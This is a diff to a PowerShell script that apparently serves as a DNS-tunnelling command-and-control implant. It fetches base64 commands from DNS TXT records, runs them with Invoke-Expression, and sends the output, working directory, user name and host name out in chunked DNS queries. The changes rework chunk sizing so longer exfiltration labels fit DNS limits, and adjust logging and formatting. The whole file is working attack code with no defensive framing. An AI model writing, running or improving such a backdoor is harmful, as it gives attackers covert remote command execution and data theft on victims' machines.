@@ -43,8 +43,8 @@ function Send-Data {
     )
 
     $metadata = @{
-        pwd = $PWD.Path
-        user = $Env:UserName
+        pwd      = $PWD.Path
+        user     = $Env:UserName
         hostname = hostname
     }
 
@@ -58,19 +58,25 @@ function Send-Data {
 
     # Replace padding characters with _ so it can be transmitted over DNS
     $encodedData = $encodedData.Replace("=", "_")
-    
-    $chunk_size = 63 # Max size of a DNS label (between two dots)
-    $chunks = [Math]::Ceiling($encodedData.Length / $chunk_size) # Calculate the number of chunks
         
+    # 250 (less than 255 to be safe) - length of rest of DNS Query and length of $i in the coming for loop
+    $chunk_size = 200 - "$code-$counter.$domain".Length
+    Write-Host "Chunk Size: " $chunk_size
+    $chunks = [Math]::Ceiling($encodedData.Length / $chunk_size) # Calculate the number of chunks
+            
     for ($i = 0; $i -lt $chunks; $i++) {
         Write-Host "Sending Chunk $($i+1) of $chunks"
-        $currentChunk = $encodedData.Substring($i * $chunk_size, [Math]::Min($chunk_size, $encodedData.Length - $i * $chunk_size))
-        $query = "$i.$chunks.$code-$counter.$domain"
-        $dnsQuery = "$currentChunk.$query"
+        $chunkdata = $encodedData.Substring($i * $chunk_size, [Math]::Min($chunk_size, $encodedData.Length - $i * $chunk_size))
+        if ($chunkdata.length -gt 63) {
+            # Add dot after every 63 chars, because of max chunk size (see $chunk_size above)
+            for ($a = 63; $a -lt $chunkdata.Length; $a += 64) { $chunkdata = $chunkdata.Insert($a, ".") }
+        }
+        $dnsQuery = "$chunkdata.$i.$chunks.$code-$counter.$domain"
+        Write-Host "Query: $dnsQuery"
 
         # Send DNS query
         $dnsResult = Resolve-DnsName -Name $dnsQuery -ErrorAction Ignore -Type A
-
+    
         if ($dnsResult) {
             # Never has a response ready, hopefully :-)
         }
@@ -92,14 +98,14 @@ while (!$stop) {
     Write-Host "Request to: $commandcount.$code.$domain"
     $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Type TXT -ErrorAction Ignore
     if ($dnsResult) {
-        try{
+        try {
             $command = $dnsResult.Strings
             Write-Host "Command: $command"
             $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($command))
             $output = $command | Invoke-Expression -ErrorAction Stop
             $output = ($output | Format-Table | Out-String)
             Write-Host "Send Output with length $($output.Length)"
-            if($output.Length -eq 0){
+            if ($output.Length -eq 0) {
                 $output = ""
             }
             # Send current PWD
